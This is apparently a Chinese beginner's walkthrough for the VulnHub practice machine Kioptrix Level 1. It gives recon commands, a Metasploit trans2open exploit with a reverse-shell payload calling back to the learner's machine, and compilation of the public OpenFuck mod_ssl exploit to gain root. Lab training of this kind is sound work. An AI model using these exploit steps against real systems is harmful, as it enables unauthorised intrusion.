# 第一台靶机攻略：Kioptrix Level 1（你的第一场"整机渗透"）

> 只打这台从 VulnHub 下载的靶机。它是 2009 年的老机器，洞多且经典，就是给新手设计的。

## 1. 准备

1. VulnHub 搜 Kioptrix Level 1，下载 VM 镜像
2. 导入 VMware：Kali 和靶机都设成**桥接**（或都"仅主机模式"）
3. 靶机开机后，Kali 里找它：

```bash
arp-scan -l            # 列出同网段设备，找出靶机 IP
# 或者
netdiscover -r 192.168.1.0/24
```

## 2. 侦察（你的第一次实战 nmap）

```bash
nmap -sV -p- 靶机IP
```

预期结果：80（Apache）、443（mod_ssl）、139（SMB/Samba）、22（SSH）、111（RPC）等。
**记录**：每个端口、服务、版本号——版本号就是下一步的线索。

## 3. 两条攻击路径（任选其一，建议都试）

### 路径 A：Samba 老版本 → trans2open

老 Samba 2.2.x 有经典溢出：

```bash
searchsploit samba 2.2
msfconsole
> use exploit/linux/samba/trans2open
> set RHOSTS 靶机IP
> set PAYLOAD linux/x86/shell_reverse_tcp
> set LHOST 你的Kali IP
> run
```
拿到 shell 后 `id` 看看自己是谁。

### 路径 B：mod_ssl 老版本 → OpenFuck

443 上跑的老 mod_ssl 有公开 exploit（OpenFuck/764.c）：

```bash
searchsploit mod_ssl
# 找到 764.c，按 WriteUp 编译执行
gcc -o openfuck 764.c -lcrypto
./openfuck 0x6b 靶机IP 443
```

## 4. 完成标准

- [ ] 拿到 **root shell**（`id` 显示 root）
- [ ] 能讲清楚：这台机器开的什么服务 → 哪个版本 → 为什么能打
- [ ] 截图存档 + 写 3 行总结进打卡

## 5. 三个提醒

1. **卡住就查 WriteUp**（搜 "Kioptrix Level 1 walkthrough"），看懂后关掉教程自己再打一遍——第一台机器就是用来练"查资料"的
2. 老系统在 VMware 新版本里可能崩/连不上，常见解法：兼容性调低、换网络模式，搜 "Kioptrix VMware issues"
3. 全程别超 3 天：第 1 天侦察 + 尝试，第 2 天查 WriteUp，第 3 天独立复现。**拖太久会消耗热情，热情比这题值钱**

## 6. 这台机器对你简历的意义

"独立完成 VulnHub Kioptrix 整机渗透（Samba 溢出拿 root）"——应届生简历上有这一行，等于把"我学过"换成"我打过"。
